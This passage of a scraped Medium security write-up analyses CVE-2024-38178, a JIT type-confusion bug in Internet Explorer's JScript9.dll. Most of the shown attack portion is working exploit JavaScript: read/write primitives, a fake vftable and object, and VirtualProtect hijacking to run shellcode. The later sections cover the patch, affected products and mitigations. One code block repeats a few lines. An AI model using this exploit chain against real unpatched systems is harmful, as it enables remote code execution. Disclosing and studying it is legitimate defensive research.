and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 499px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*VeO80D-fq24_oLUUcIC26w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*VeO80D-fq24_oLUUcIC26w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*VeO80D-fq24_oLUUcIC26w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*VeO80D-fq24_oLUUcIC26w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*VeO80D-fq24_oLUUcIC26w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*VeO80D-fq24_oLUUcIC26w.png 1100w, https://miro.medium.com/v2/resize:fit:998/1*VeO80D-fq24_oLUUcIC26w.png 998w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 499px"/><img alt="" class="bh md qt c" width="499" height="375" loading="eager" role="presentation"/></picture></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du rq fj rr rs">Figure 7. Output of b[52].length (left)/imagebase of JScript9.dll (right)</figcaption></figure></div></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="c90c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">3.2 Stage 2 — Obtain Arbitrary Read/Write Primitive</strong></p><p id="1281" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Use a DataView object to obtain arbitrary read/write primitives. A <a class="af pb" href="https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/DataView" rel="noopener ugc nofollow" target="_blank">DataView</a> provides a low-level interface for reading and writing number-type data from an ArrayBuffer. <code class="cx qy qz ra rb b">b[52]</code>Relative R/W can be used to leak the address of the DataView object. Then, <code class="cx qy qz ra rb b">b[54]</code> can reference the DataVierw object and call the getUint32/setUint32 methods for arbitrary read/write.</p><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="a201" class="rf nz gu rb b bg rg rh l ri rj">    var arraybuffer = new ArrayBuffer(16);<br/>    var dataview = new DataView(arraybuffer);<br/>    b[53][0] = dataview<br/>  <br/>    // Leak b[53] Array Content Pointer<br/>    var b53 = {<br/>        addr_low: b[52][32],<br/>        addr_high: b[52][33]<br/>    };<br/><br/><br/>    // Overwrite b[54] Array Content Pointer<br/>    b[52][80] = b53.addr_low; <br/>    b[52][81] = b53.addr_high;<br/>    b[52][82] = b53.addr_low;<br/>    b[52][83] = b53.addr_high;<br/><br/><br/>   // Get dataview object address<br/>    var dataview_obj = {<br/>        addr_low: b[54][0],<br/>        addr_high: b[54][1]<br/>    };<br/><br/><br/>    b[52][80] = dataview_obj.addr_low - 4;<br/>    b[52][81] = dataview_obj.addr_high;<br/>    b[52][82] = dataview_obj.addr_low - 4;<br/>    b[52][83] = dataview_obj.addr_high;<br/><br/><br/>    function read4(addr_low, addr_high) {<br/>        b[54][7] = addr_low;  <br/>        b[54][8] = addr_high;<br/>        return dataview[&#x27;getUint32&#x27;](0, true);  <br/>    }<br/><br/><br/>    function write4(addr_low, addr_high, val) {<br/>        b[54][7] = addr_low;  <br/>        b[54][8] = addr_high;<br/>        dataview[&#x27;setUint32&#x27;](0, val, true);<br/>    }</span></pre><p id="c264" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">3.3 Stage 3 — Configure Fake Vftable and Fake Object</strong></p><p id="77de" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">To create the fake objects, create literal, shellcode, and compound strings and assign them to <code class="cx qy qz ra rb b">b[53][1]</code>, <code class="cx qy qz ra rb b">b[53][2]</code>, and <code class="cx qy qz ra rb b">b[53][3]</code>, respectively. Find the address of each string object and find the address of <code class="cx qy qz ra rb b">b[56][0]</code>, which is the address we will use as the fake vftable.</p><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="527e" class="rf nz gu rb b bg rg rh l ri rj">    b[53][1] = literal_string,<br/>    b[53][3] = compound_string,<br/>    b[53][2] = shellcode;<br/><br/><br/>    // b[53][1]<br/>    literal_str_obj = {<br/>        addr_low : read4(b[52][32] + 0x20, b[52][33]),<br/>        addr_high : read4(b[52][32] + 0x24, b[52][33])<br/>    };<br/><br/><br/>    // b[53][2]<br/>    shellcode_str_obj = {<br/>        addr_low : read4(b[52][32] + 0x28, b[52][33]),<br/>        addr_high : read4(b[52][32] + 0x2C, b[52][33])<br/>    };<br/><br/><br/>    // b[53][3]<br/>    compound_str_obj = {<br/>        addr_low : read4(b[52][32] + 0x30, b[52][33]),<br/>        addr_high : read4(b[52][32] + 0x34, b[52][33])<br/>    };<br/><br/><br/>    // fake vftable (= b[56][0] address)<br/>    fake_vftable = {<br/>        addr_low : b[52][176] + 0x18,<br/>        addr_high : b[52][177]<br/>    };</span></pre><p id="dc65" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Configure the Fake Object to the content buffer address of the shellcode string as follows.</p><ul class=""><li id="4332" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pc pd pe bk"><code class="cx qy qz ra rb b">fake_obj + 0x0</code> = fake vftable</li><li id="3f6c" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><code class="cx qy qz ra rb b">fake_obj + 0x8</code> = literal string type</li><li id="8c1f" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><code class="cx qy qz ra rb b">fake_obj + 0x10</code> = compound string length</li><li id="561b" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><code class="cx qy qz ra rb b">fake_obj + 0x18</code> = compound string buffer pointer</li><li id="0196" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><code class="cx qy qz ra rb b">fake_obj + 0x20</code> = shellcode string object address</li></ul><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="b848" class="rf nz gu rb b bg rg rh l ri rj">// make fake object<br/>fake_obj = {<br/>    addr_low : read4(shellcode_str_obj.addr_low + 0x20, shellcode_str_obj.addr_high),<br/>// make fake object<br/>fake_obj = {<br/>    addr_low : read4(shellcode_str_obj.addr_low + 0x20, shellcode_str_obj.addr_high),<br/>    addr_high : read4(shellcode_str_obj.addr_low + 0x24, shellcode_str_obj.addr_high)<br/>};<br/><br/><br/>// write fake vftable<br/>write8(fake_obj.addr_low, fake_obj.addr_high, <br/>      fake_vftable.addr_low,fake_vftable.addr_high);<br/><br/><br/>// write literal string type<br/>literal_str_type = {<br/>    addr_low : read4(literal_str_obj.addr_low + 0x8, literal_str_obj.addr_high),<br/>    addr_high : read4(literal_str_obj.addr_low + 0xC, literal_str_obj.addr_high)<br/>};<br/>write8(fake_obj.addr_low + 0x8, fake_obj.addr_high, <br/>      literal_str_type.addr_low, literal_str_type.addr_high );<br/><br/><br/>// write compound string length<br/>compound_str_length = {<br/>    addr_low : read4(compound_str_obj.addr_low + 0x10, compound_str_obj.addr_high),<br/>    addr_high : read4(compound_str_obj.addr_low + 0x14, compound_str_obj.addr_high)<br/>};<br/>write8(fake_obj.addr_low + 0x10, fake_obj.addr_high, <br/>      compound_str_length.addr_low, compound_str_length.addr_high);<br/> <br/>  // write compound string buffer pointer<br/>compound_str_buffer = {<br/>    addr_low : read4(compound_str_obj.addr_low + 0x20, compound_str_obj.addr_high),<br/>    addr_high : read4(compound_str_obj.addr_low + 0x24, compound_str_obj.addr_high)<br/>};<br/>write8(fake_obj.addr_low + 0x18, fake_obj.addr_high, <br/>      compound_str_buffer.addr_low, compound_str_buffer.addr_high);<br/><br/><br/>// overwrite b[53][1] with fake object<br/>write8(b[52][32] + 0x20, b[52][33], fake_obj.addr_low, fake_obj.addr_high);</span></pre><p id="35f3" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><code class="cx qy qz ra rb b">b[53][1]</code>, where the literal string is located, will point to the fake object as shown in the figure so that when the method is called, the literal string in <code class="cx qy qz ra rb b">b[53][1]</code> will reference the fake vftable.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jqNmxHJZFvQmXkrpFNaUkw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jqNmxHJZFvQmXkrpFNaUkw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jqNmxHJZFvQmXkrpFNaUkw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jqNmxHJZFvQmXkrpFNaUkw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jqNmxHJZFvQmXkrpFNaUkw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jqNmxHJZFvQmXkrpFNaUkw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*jqNmxHJZFvQmXkrpFNaUkw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jqNmxHJZFvQmXkrpFNaUkw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jqNmxHJZFvQmXkrpFNaUkw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jqNmxHJZFvQmXkrpFNaUkw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jqNmxHJZFvQmXkrpFNaUkw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jqNmxHJZFvQmXkrpFNaUkw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jqNmxHJZFvQmXkrpFNaUkw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*jqNmxHJZFvQmXkrpFNaUkw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="832" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 8. The result of configuring method b[53][1] to reference a fake object.</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="beac" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">3.4 Stage 4 — Reference the Fake Object and Execute Shellcode</strong></p><p id="e0c7" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Obtain the KERNEL32.dll image base and VirtualProtect function address based on the image base of the leaked JScript9.dll. <code class="cx qy qz ra rb b">b[53][1]</code> When calling the trim method of the literal string, refer to the vftable pointer of the fake object, calling the function located at offset <code class="cx qy qz ra rb b">vftable + 0x2c8</code>. Since the vftable pointer is pointing to the address<code class="cx qy qz ra rb b">b[56][0]</code>,we can call the desired function by modifying <code class="cx qy qz ra rb b">b[56][0] + 0x2c8</code>.</p><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="8a43" class="rf nz gu rb b bg rg rh l ri rj">CreateFileW_low = read4(jscript9_base.addr_low + 0x3d1698, jscript9_base.addr_high);<br/>CreateFileW_high = read4(jscript9_base.addr_low + 0x3d1698+4, jscript9_base.addr_high);<br/><br/><br/>kernel32_base = {<br/>    addr_low: CreateFileW_low - 0x20460,<br/>    addr_high: CreateFileW_high<br/>};<br/><br/><br/>VirtualProtect = {<br/>    addr_low: kernel32_base.addr_low + 0x15470,<br/>    addr_high: kernel32_base.addr_high<br/>};<br/><br/><br/>//...<br/><br/><br/>// Write VirtualProtect/shellcode address to <br/>  Js::JavascriptString::GetOriginalStringReference offset (vftable + 0x2c8)<br/>write8(fake_vftable.addr_low + 0x2c8, fake_vftable.addr_high, <br/>      VirtualProtect.addr_low, VirtualProtect.addr_high);<br/>b[53][1][&#x27;trim&#x27;]();</span></pre><p id="9b6a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">In the debugging results just before the call to the VirtualProtect function, we can see that the first argument, the <strong class="my gv">rcx</strong> register, grants execution rights to the shellcode address. Then, at the same offset, we modify it with the shellcode address we want to execute instead of VirtualProtect and call the trim method once more, and the shellcode is executed.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rt"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*zCDxZaJVsNndp3qCZD4XTw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*zCDxZaJVsNndp3qCZD4XTw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*zCDxZaJVsNndp3qCZD4XTw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*zCDxZaJVsNndp3qCZD4XTw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*zCDxZaJVsNndp3qCZD4XTw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*zCDxZaJVsNndp3qCZD4XTw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*zCDxZaJVsNndp3qCZD4XTw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*zCDxZaJVsNndp3qCZD4XTw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*zCDxZaJVsNndp3qCZD4XTw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*zCDxZaJVsNndp3qCZD4XTw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*zCDxZaJVsNndp3qCZD4XTw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*zCDxZaJVsNndp3qCZD4XTw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*zCDxZaJVsNndp3qCZD4XTw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*zCDxZaJVsNndp3qCZD4XTw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="319" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 9. Calling the VirtualProtect function to grant execute privileges to a shellcode address</figcaption></figure><figure class="lu pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*oC4Esk7zrs-JHV5-HyLq-Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*oC4Esk7zrs-JHV5-HyLq-Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*oC4Esk7zrs-JHV5-HyLq-Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*oC4Esk7zrs-JHV5-HyLq-Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*oC4Esk7zrs-JHV5-HyLq-Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*oC4Esk7zrs-JHV5-HyLq-Q.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*oC4Esk7zrs-JHV5-HyLq-Q.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*oC4Esk7zrs-JHV5-HyLq-Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*oC4Esk7zrs-JHV5-HyLq-Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*oC4Esk7zrs-JHV5-HyLq-Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*oC4Esk7zrs-JHV5-HyLq-Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*oC4Esk7zrs-JHV5-HyLq-Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*oC4Esk7zrs-JHV5-HyLq-Q.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*oC4Esk7zrs-JHV5-HyLq-Q.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="532" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 10. Shellcode execution results in the Calculator.exe process running</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="892b" class="pk nz gu bf oa pl pm dy oe pn po ea oi nh pp pq pr nl ps pt pu np pv pw px py bk">4. Patched Code</h2><p id="36d8" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">In the August 2024 update, MS added code to compare the types of two operands using directly <code class="cx qy qz ra rb b">ValueType::operator</code> even if the <code class="cx qy qz ra rb b">ValueType::IsUninitialized</code> the function returns False and also added code to call <code class="cx qy qz ra rb b">IR::Opnd::SetValueType</code> to perform a typecasting if the types do not match as a result of the operation to prevent type confusion.</p><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="dc83" class="rf nz gu rb b bg rg rh l ri rj">void __fastcall GlobOpt::OptArraySrc(struct BasicBlock **this, IR::Opnd **a2)<br/>{<br/>//...<br/>  if ( v5 &amp;&amp; !GlobOpt::IsLoopPrePass(this) )<br/>  {<br/>+   v10 = (v43 + 16);<br/>+   // if feature is enabled, always return true<br/>+   if(wil::details::FeatureImpl&lt;__WilFeatureTraits_Feature_1489045819&gt;::__private_IsEnabled(..))<br/>+   {<br/>+     if ( ValueType::IsUninitialized(v10) )<br/>+       goto LABEL_22;<br/>+     v35[0] = *(v8 + 10);<br/>+     v13 = *(v8 + 16);<br/>+     if ( !ValueType::IsUninitialized(v35) )<br/>+     {<br/>+       v35[0] = v12;<br/>+       if ( !ValueType::operator!=(v35, v13) )<br/>+         goto LABEL_22;<br/>+       LOWORD(v13) = v13 | 1;<br/>+     }<br/>+     IR::Opnd::SetValueType(v8, v13);<br/>+     v8 = v43;<br/>+   }<br/>             <br/>    else if ( !ValueType::IsUninitialized(v10) )<br/>    {<br/>      v35[0] = *(v8 + 10);<br/>      if ( ValueType::IsUninitialized(v35) )<br/>      {<br/>        IR::Opnd::SetValueType(v8, *(v8 + 16));<br/>        v8 = v43;<br/>      }<br/>    }<br/>  }<br/>  goto LABEL_15;<br/>}</span></pre><h1 id="fd54" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Impact</h1><p id="56ba" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">This vulnerability is in JScript9.dll, a legacy JavaScript engine in Internet Explorer that has been deprecated. Basically, any software that uses it is potentially vulnerable. We further investigated a partial list of software that loads this engine and found it below.</p><p id="b630" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Affected Product</strong></p><ul class=""><li id="6b73" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pc pd pe bk">Microsoft Edge (Internet Explorer Mode)</li><li id="47ae" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">GOMPlayer 2.3.100.5370(Toast Popup 1.0.0.8) — gom&amp;company</li><li id="9b2d" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">KMPlayer 4.2.3.14 — Pandora TV</li><li id="fa63" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">PotPlayer 1.7.22318 — Kakao Corp</li></ul><p id="5196" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">* As of July 15, 2024, additional impact analysis for GOMPlayer version 2.3.100.5370 is available in See <strong class="my gv">Appendix C. Affected Product — GOMPlayer</strong></p><p id="4ff3" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Software that uses the legacy WebView controller for web browsing, ad pop-up rendering, etc., including those listed above, is affected or <strong class="my gv">potentially vulnerable</strong> to this vulnerability, and we recommend not using it until you install the August 2024 Windows Cumulative Update.</p><p id="9388" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">* Maximum impact is remote code execution with a Medium Integrity Level if no separate sandbox exists.</p><p id="d7cb" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">In addition, attacks that exploit the JScript9.dll vulnerability, such as CVE-2020-1380 and CVE-2022-41128, have been discovered in recent years, so even if you have updated to the latest version, you may still be a target for future attacks.</p><h1 id="9d0f" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Mitigation</h1><p id="5e94" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">For Edge, users set the Allow sites to reload in Internet Explorer mode option to Disallow (default) in Settings-Default Browser-Internet Explorer Compatibility. For MS Office, set it to block the loading of remote HTML content (default).</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg ru"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*iFVcjNK3EQa6FePhgZpGgA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*iFVcjNK3EQa6FePhgZpGgA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*iFVcjNK3EQa6FePhgZpGgA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*iFVcjNK3EQa6FePhgZpGgA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*iFVcjNK3EQa6FePhgZpGgA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*iFVcjNK3EQa6FePhgZpGgA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*iFVcjNK3EQa6FePhgZpGgA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*iFVcjNK3EQa6FePhgZpGgA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*iFVcjNK3EQa6FePhgZpGgA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*iFVcjNK3EQa6FePhgZpGgA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*iFVcjNK3EQa6FePhgZpGgA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*iFVcjNK3EQa6FePhgZpGgA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*iFVcjNK3EQa6FePhgZpGgA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*iFVcjNK3EQa6FePhgZpGgA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="561" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 11. Settings that disallow the use of IE Mode</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="27d0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Users should also be careful not to view Web pages or document files from unknown or suspicious sources. If you are using an application that loads JScript9.dll through a legacy WebView controller, users should install Windows August Cumulative Update because there is no separate mitigation for this vulnerability.</p><p id="db11" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Software vendors are encouraged to change the web viewer in their products to Edge-based WebView to avoid using JScript9.dll, which continues to be targeted. In addition, we recommend utilizing software bills of materials (SBOM) to identify these third-party components and regularly monitoring vulnerabilities and product lifecycles to build a response plan for legacy modules.</p><h1 id="c06c" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Conclusion</h1><ul class=""><li id="aba3" class="mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt pc pd pe bk">CVE-2024-38178 is a remote code execution vulnerability in the JIT compiler of JScript9.dll, the legacy JavaScript Engine in Internet Explorer, caused by an incorrect assumption in type validation.</li><li id="4e0d" class="mw mx gu my b 